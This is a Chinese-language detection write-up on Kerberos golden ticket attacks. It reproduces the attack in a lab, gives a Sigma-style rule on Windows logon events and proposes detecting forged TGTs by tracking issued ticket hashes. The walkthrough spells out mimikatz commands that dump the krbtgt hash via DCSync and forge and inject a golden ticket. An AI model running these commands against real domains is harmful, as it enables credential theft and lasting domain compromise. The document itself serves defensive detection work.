---
title: 监控黄金票据攻击行为
date: 2020-04-16 21:21:21
tags: ATT&CK-持久性
---

## 简介

票据传递攻击（PtT）是一种不访问账号密码而使用Kerberos凭据对用户进行身份认证的方法。Kerberos身份认证可以是横向移动到远程系统的第一步。
在使用PtT技术时，可通过凭据导出技术获取有效账号的Kerberos票据。PtT可能会获取到用户的服务票据或票据授予票据（TGT），具体取决于访问级别。服务票据允许访问特定资源，而TGT可用于从票据授予服务（TGS）请求服务票据，用来访问用户有权访问的任何资源。
PtT技术可以为使用Kerberos作为身份认证机制的服务获取白银票据，并用于生成票据来访问特定资源和承载该资源的系统（例如，SharePoint）。
PtT技术还可以使用密钥分发服务账号KRBTGT帐户NTLM哈希来获得域的黄金票据，从而为活动目录中的任一账号生成TGT。

## 测试案例

黄金票据（golden ticket）：伪造票据授予票据（TGT），也被称为认证票据。与其说是一种攻击方式，不如说是一种后门，当域控权限掉后，再重新获取权限，因为常见的在域中管理员知道自己被入侵了 往往只是简单的修改域管的账号 恰恰krbtgt却被忽略…

## 检测日志

windows 安全日志

## 测试复现

### 测试环境

Windows server 2016（AD域控）

Win 7（靶机）

### 测试过程

#### 尝试访问DC目录

```dos
dir \\ICBC.abcc.org\c$\
```

![访问DC目录](https://s1.ax1x.com/2020/04/16/JFzcM6.png)

#### 导出krbtgt用户的hash和sid(使用mimikatz.exe工具)

```bash
lsadump::dcsync /domain:abcc.org /user:krbtgt    #domian：后面是域控名  user后面是krbtgt用户
```

![凭据](https://s1.ax1x.com/2020/04/16/JFzXdg.png)

在域内其他Client(用户机器)上使用其他域管理员来抓取krbtgt用户的hash和sid(使用mimikatz.exe工具)，这里命令和上面的命令是一样的。也可以利用其它方法获取krbtgt的NTML hash

#### 清除自己Client端(域内其他机器)的票据

在域控上面成功抓取了hash和sid，将hash和sid复制到其他域内机器中，也就是Client端，然后在mimikatz.exe执行kerberos::list查看我们当前的票据。

![清理凭据](https://s1.ax1x.com/2020/04/16/JFzjoQ.png)

如果存在其它凭据，可以使用kerberos::purge清除当前用户票据。

#### 伪造TGT票据

##### 方法一

```bash
mimikatz.exe "kerberos::golden /domain:<域名> /sid:<域SID> /rc4:<KRBTGT NTLM Hash> /user:<任意用户名> /ptt" exit
```

![伪造](https://s1.ax1x.com/2020/04/16/JkSAwF.png)

##### 验证攻击效果

```dos
dir \\ICBC.abcc.org\c$\
```

![验证](https://s1.ax1x.com/2020/04/16/JkSeY9.png)

#### 方法二

```bash
mimikatz# kerberos::gloden /domain:*.com /sid:<域SID> /krbtgt: <KRBTGT NTLM Hash> /user:<任意用户名> /ticket:test.kribi
or
mimikatz# kerberos::gloden /domain:*.com /sid: <域SID> /aes256: <KRBTGT aes256> /user: <任意用户名> /ticket:test.kribi
```

![伪造2](https://s1.ax1x.com/2020/04/16/JkSMy6.png)

#### 导入*.kribi文件

![导入](https://s1.ax1x.com/2020/04/16/JkSQOK.png)

#### 验证是否成功

![验证1](https://s1.ax1x.com/2020/04/16/JkSd6P.png)

## 测试留痕

正常日志痕迹

![正常](https://s1.ax1x.com/2020/04/16/JkS6Yj.png)

异常日志痕迹

![异常](https://s1.ax1x.com/2020/04/16/JkSykQ.png)

## 检测规则/思路

```yml
title: windows本地账户操纵
description: win7测试
references:
tags: T1087/T1069
status: experimental
author: 12306Bro
logsource:
    product: windows
    service: security
detection:
    selection1:
        EventID: 4624  #账户登录
        Account domain: '*.*' #可参考示例日志进行理解
    selection2:
        EventID: 4672  #特殊登录
        Account domain: _ #账户域为空
    timeframe: last 5s
    condition: all of them
level: medium
```

最后，以上基于日志的检测方法存在一些问题，mimikatz最新版本已经更新修复了一下问题，通过此特征检测黄金票据可能会产生误报或者漏洞，建议采用以下方法进行检测。

1.AS-REP返回的Ticket字段中，虽然经过krbtgt密码的加密，但我们仍然可以对其计算唯一摘要值。

2.跟踪每一次的AS-REP TGT票据颁发，记录下Ticket Hash，存入列表A。

3.对每一次TGS-REQ中TGT Hash进行确认，判断该值是否存在于已知颁发过的TGT列表A中。如果不存在，则属于伪造的TGT，即黄金票据。

4.列表A的内容可设置过期时间，TGT和ST的默认最大有效期都是10小时。

## 参考推荐

MITRE-ATT&CK-T1097：<https://attack.mitre.org/techniques/T1097/>
